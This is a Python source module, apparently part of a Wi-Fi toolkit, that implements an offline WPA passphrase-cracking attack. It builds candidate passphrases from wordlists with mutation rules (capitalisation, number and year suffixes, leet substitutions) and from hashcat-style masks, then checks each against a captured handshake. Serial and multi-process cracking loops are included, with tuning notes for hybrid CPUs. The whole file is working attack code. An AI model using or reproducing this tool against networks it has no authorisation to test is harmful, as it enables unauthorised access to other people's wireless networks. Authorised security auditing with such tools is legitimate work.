"""Offline PSK attack: candidate generation and the verification loop.

Generation is deliberately boring and dependency-free:

* a wordlist, optionally expanded by :func:`rules` (case, suffix, leet) — the
  fleshed-out variation set that actually breaks human-chosen passphrases;
* a mask (``?u?l?l?l?d?d``-style) for exhaustive short keys.

Every candidate is proven by recomputing the handshake MIC, so a hit is
certain rather than probable. Progress callbacks let a UI report throughput
without this module knowing about consoles.
"""

from __future__ import annotations

import itertools
import string
import time
from typing import Callable, Iterable, Iterator

from omni.wifi.wpa import Handshake, valid_psk

__all__ = ["MASK_SETS", "expand_mask", "rules", "candidates", "crack",
           "AttackResult"]

#: mask token -> character set (hashcat-compatible letters)
MASK_SETS = {
    "d": string.digits,
    "l": string.ascii_lowercase,
    "u": string.ascii_uppercase,
    "s": " !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~",
    "a": string.ascii_letters + string.digits + " !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~",
    "h": "0123456789abcdef",
    "H": "0123456789ABCDEF",
}

_LEET = (("a", "@"), ("e", "3"), ("i", "1"), ("o", "0"), ("s", "$"))


def expand_mask(mask: str) -> Iterator[str]:
    """Expand a mask; ``?``+letter is a set, ``??`` is a literal ``?``."""
    pools: list[str] = []
    index = 0
    while index < len(mask):
        char = mask[index]
        if char == "?" and index + 1 < len(mask):
            token = mask[index + 1]
            if token == "?":
                pools.append("?")
            elif token.lower() in MASK_SETS:
                pools.append(MASK_SETS[token.lower()])
            else:
                raise ValueError(f"unknown mask token ?{token}")
            index += 2
            continue
        pools.append(char)
        index += 1
    for combo in itertools.product(*pools):
        yield "".join(combo)


def rules(word: str) -> Iterator[str]:
    """Expand one word into the variations worth trying."""
    base = word.strip()
    if not base:
        return
    yield base
    yield base.capitalize()
    yield base.upper()
    yield base + "1"
    yield base + "1!"
    yield base + "123"
    yield base + "!"
    yield base + "2024"
    yield base + "2025"
    yield base + "2026"
    yield base[::-1]
    yield base * 2
    leet = base
    for plain, sub in _LEET:
        leet = leet.replace(plain, sub)
    if leet != base:
        yield leet
        yield leet + "1"
    yield word.strip().lower().replace(" ", "")


def candidates(wordlist: Iterable[str] | None = None,
               mask: str | None = None,
               use_rules: bool = False) -> Iterator[str]:
    """Yield unique legal passphrases from a wordlist and/or a mask."""
    seen: set[str] = set()

    def emit(value: str) -> Iterator[str]:
        value = value.strip()
        if value and value not in seen and valid_psk(value):
            seen.add(value)
            yield value

    for word in wordlist or ():
        for variant in (rules(word) if use_rules else (word,)):
            yield from emit(variant)
    if mask:
        for value in expand_mask(mask):
            yield from emit(value)


class AttackResult:
    """Outcome of a run, kept explicit so callers cannot misread it."""

    def __init__(self) -> None:
        self.passphrase: str | None = None
        self.tried = 0
        self.seconds = 0.0
        self.complete = False       # whole space exhausted without a hit

    @property
    def rate(self) -> float:
        return self.tried / self.seconds if self.seconds else 0.0

    @property
    def found(self) -> bool:
        return self.passphrase is not None

    def summary(self) -> str:
        if self.found:
            return (f"FOUND {self.passphrase!r} after {self.tried} tries "
                    f"({self.rate:.0f}/s)")
        note = "space exhausted" if self.complete else "stopped early"
        return f"no match — {self.tried} tried ({self.rate:.0f}/s), {note}"


def _try_chunk(args: tuple) -> str | None:
    """Worker: return the first matching candidate in one chunk."""
    handshake, chunk = args
    for value in chunk:
        if handshake.verify(value):
            return value
    return None


def _chunks(source: Iterator[str], size: int) -> Iterator[list[str]]:
    buffer: list[str] = []
    for value in source:
        buffer.append(value)
        if len(buffer) >= size:
            yield buffer
            buffer = []
    if buffer:
        yield buffer


def crack_parallel(handshake: Handshake, wordlist: Iterable[str] | None = None,
                   mask: str | None = None, use_rules: bool = True,
                   limit: int | None = None, workers: int | None = None,
                   progress: Callable[[int, float], None] | None = None,
                   chunk_size: int = 32) -> AttackResult:
    """Same as :func:`crack` but spreads chunks over a process pool.

    PBKDF2 is the bottleneck, so parallelism is the only lever — but two
    details matter on a hybrid CPU (P-cores + E-cores):

    * **workers** default to about half the logical CPUs, not all of them.
      Oversubscribing a 14-thread part measured *slower* than 8 workers
      (context switching + HT contention, no extra PBKDF2 throughput).
    * **chunk_size** stays small so the fast cores keep taking work instead of
      finishing one big static chunk and idling while the E-cores grind.
    """
    import os
    from concurrent.futures import ProcessPoolExecutor, as_completed

    if workers is None:
        workers = max(2, min(8, (os.cpu_count() or 4) // 2))
    result = AttackResult()
    started = time.time()
    source = candidates(wordlist, mask, use_rules)
    try:
        return _run_pool(handshake, source, workers, limit, progress, result,
                         started, chunk_size)
    except Exception as exc:                    # noqa: BLE001 - spawn problems
        # an unguarded __main__ on Windows breaks process spawning; serial
        # still works and never crashes the caller
        if result.tried or workers == 1:
            raise
        result.seconds = time.time() - started
        import sys
        print(f"crack: falling back to serial ({exc.__class__.__name__})",
              file=sys.stderr)
        return crack(handshake, wordlist, mask, use_rules, limit, None, None)


def _run_pool(handshake: Handshake, source: Iterator[str], workers: int,
              limit: int | None,
              progress: Callable[[int, float], None] | None,
              result: AttackResult, started: float,
              chunk_size: int) -> AttackResult:
    from concurrent.futures import ProcessPoolExecutor, as_completed

    pending: set = set()
    try:
        with ProcessPoolExecutor(max_workers=workers) as pool:
            for chunk in _chunks(source, chunk_size):
                if limit is not None and result.tried + len(pending) * chunk_size >= limit:
                    break
                pending.add(pool.submit(_try_chunk, (handshake, chunk)))
                if len(pending) >= workers * 2:
                    done = next(as_completed(list(pending)))
                    pending.discard(done)
                    result.tried += chunk_size
                    hit = done.result()
                    if progress:
                        progress(result.tried, time.time() - started)
                    if hit:
                        result.passphrase = hit
                        break
            while pending and not result.found:
                done = next(as_completed(list(pending)))
                pending.discard(done)
                result.tried += chunk_size
                hit = done.result()
                if hit:
                    result.passphrase = hit
                    break
        if not result.found and limit is None:
            result.complete = True
    finally:
        result.seconds = time.time() - started
    return result


def crack(handshake: Handshake, wordlist: Iterable[str] | None = None,
          mask: str | None = None, use_rules: bool = True,
          limit: int | None = None,
          progress: Callable[[int, float], None] | None = None,
          should_stop: Callable[[], bool] | None = None) -> AttackResult:
    """Try candidates against one handshake until a hit or exhaustion."""
    result = AttackResult()
    started = time.time()
    source = candidates(wordlist, mask, use_rules)
    try:
        for value in source:
            result.tried += 1
            if handshake.verify(value):
                result.passphrase = value
                break
            if limit is not None and result.tried >= limit:
                break
            if progress and result.tried % 250 == 0:
                progress(result.tried, time.time() - started)
            if should_stop and result.tried % 250 == 0 and should_stop():
                break
        else:
            result.complete = True
    finally:
        result.seconds = time.time() - started
    return result
